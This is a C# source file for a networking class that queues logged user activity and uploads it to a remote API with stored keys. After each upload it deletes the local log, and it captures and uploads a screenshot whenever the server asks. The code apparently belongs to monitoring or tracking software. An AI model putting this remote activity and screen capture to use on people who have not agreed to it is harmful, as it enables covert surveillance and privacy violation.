using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using Zatty.Models;
using Zatty.Utils;
namespace Zatty.Core
{
    class Network
    {
        private string encryptionKey, authenticationKey, sendKey;

        private List<Send> queue = new List<Send>();
        private List<Activity> qActivities = new List<Activity>();

        private System.Windows.Forms.Timer qTimer = new System.Windows.Forms.Timer();
        private bool tActive = false;
        public Network(string sendKey, string encryptionKey, string authenticationKey)
        {
            this.encryptionKey = encryptionKey;
            this.authenticationKey = authenticationKey;
            this.sendKey = sendKey;

            qTimer.Interval = 1000;
            qTimer.Tick += qTimer_Tick; ;
            qTimer.Start();
        }

        public void AddToQueue(string type, string data)
        {
            queue.Add(new Send { type = type, data = data });
        }

        private void qTimer_Tick(object sender, EventArgs e)
        {
            if (!tActive && queue.Count > 0)
                new Thread(delegate()
                {
                    tActive = true;
                    try
                    {
                        while (queue.Count > 0)
                        {
                            Send t = queue[0];
                            var len = qActivities.Count;
                            var ToSendActivities = qActivities;
                            var sent = Api.Send(t.type, t.data, sendKey, encryptionKey, authenticationKey);
                            if (sent.status == 200)
                            {
                                if (t.type == "log") {
                                    qActivities.RemoveRange(0, len);
                                    FileLog.Delete();
                                }
                                if (sent.message == "screenshot" )
                                {
                                    var ssdata = new Screenshot { time = DateTime.Now.ToString(), img = ScreenHelper.TakeScreenshot() };
                                    AddToQueue("screenshot", fastJSON.JSON.ToJSON(ssdata));
                                }
                                queue.RemoveAt(0);
                            }
                            else
                            {
                                tActive = false;
                                return;
                            }
                        }
                        tActive = false;
                    }
                    catch { tActive = false; }
                }).Start();

        }
        public void AddToQueue(Activity e)
        {
            qActivities.Add(e);
            FileLog.Save(e);
            for (int i = 0; i < queue.Count; i++)
            {
                if (queue[i].type == "log")
                {
                    queue[i].data = fastJSON.JSON.ToJSON(qActivities);
                    return;
                }
            }
            queue.Add(new Send {  type="log",data= fastJSON.JSON.ToJSON(qActivities) });
        }

    }
}
